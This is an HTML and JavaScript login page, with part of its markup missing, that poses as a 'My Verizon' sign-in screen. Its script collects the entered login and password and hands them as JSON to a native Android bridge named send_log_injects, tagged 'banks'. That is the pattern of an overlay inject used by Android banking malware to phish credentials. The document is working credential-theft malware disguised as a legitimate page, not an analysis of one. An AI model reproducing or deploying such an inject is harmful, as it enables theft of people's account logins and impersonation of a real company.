<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
<style>
    form {
        display: flex;
        flex-direction: column;
        min-height: 100vh;
    }
    .cool-input {
            box-sizing: border-box;
            border: 0;
            width: 100%;
            position: relative;
            font-size: 16px;
            margin-bottom: 15px;
        }

        .cool-input__input {
            box-sizing: border-box;
            background: none;
            width: 100%;
            padding: 10px;
            padding-left: 0;
            position: relative;
            z-index: 2;
            font-size: 14px;
        }

        .cool-input__input:focus {
            outline: none;
        }

        .cool-input__placeholder {
            box-sizing: border-box;
            border: none;
            background: none;
            width: auto;
            position: absolute;
            z-index: 1;
            left: 0;
            top: 50%;
            line-height: 1em;
            color: #4e4e4e;
            transition: all 0.2s ease;
            font-weight: 700;
        }

        .cool-input__input_filled + .cool-input__placeholder, .cool-input__input:focus + .cool-input__placeholder {
            font-size: 0.8em;
            top: 0;
            margin-top: 0.3em;
            padding: 5px 0;
            z-index: 99;
            width: auto;
            left: 0;
        }

        .cool-input__input:focus + .cool-input__placeholder {
            color: #4e4e4e
        }

        .input {
            border: 0;
            border-bottom: 1px solid #bcbcbc;
            margin-top: 15px;
            padding-left: 0;
            transition: all 0.2s ease;
            color: #000;
            padding-right: 25px;
        }

        .input:focus {
            border-bottom: 1px solid #5c5c5c;
        }

        input,button {
            outline: none !important;
            box-shadow: none !important;
        }

        .error {
            border-color: #f00 !important
        }
        footer{
            padding: 15px;
        }
        .button {
            width: 100%;
            padding: 14px;
            color: #fff;
            background-color: #000000;
            border: 0;
            border-radius: 30px;
        }

        .button:disabled {
            opacity: 0.4;
        }
        section{
            padding: 15px;
            flex: 0.5;
        }
        header {
            flex: 0.5;
        }
</style>
</head>

        <input type="submit" disabled class="button" id="sendData" disabled value="Sign in">
        <p style="text-align:center; padding-top:5px; font-weight:700; font-size: 12px;">Register for My Verizon</p>

    </form>
    <script>
        var checkOff = document.getElementById('checkOff'),
            checkOn = document.getElementById('checkOn');

        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var sendData = document.getElementById('sendData');
        
        var eye = document.getElementById('eye');
        
        checkOff.onclick = () => {    
            checkOff.style.display = 'none';
            checkOn.style.display = 'inline';
        }

        checkOn.onclick = () => {
            checkOff.style.display = 'inline';
            checkOn.style.display = 'none';
        }

        $('.cool-input__input').on('input', function(){
            var $this = $(this);
            if ($this.val() == '') {
                $this.removeClass('cool-input__input_filled');
            } else {
                $this.addClass('cool-input__input_filled');
            }
        });

        function check() {
            if(login.value.length >= 4 && password.value.length >= 4) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        login.onkeyup = () => {
            check();
        }

        password.onkeyup = () => {
            check();
        }

            sendData.onclick = () => {
                var data = {};
                data.login = login.value;
                data.password = password.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
            eye.onclick = () => {
                if(password.type == 'password') {
                    password.type = 'text';
                } else {
                    password.type = 'password';
                }
            }
    </script>
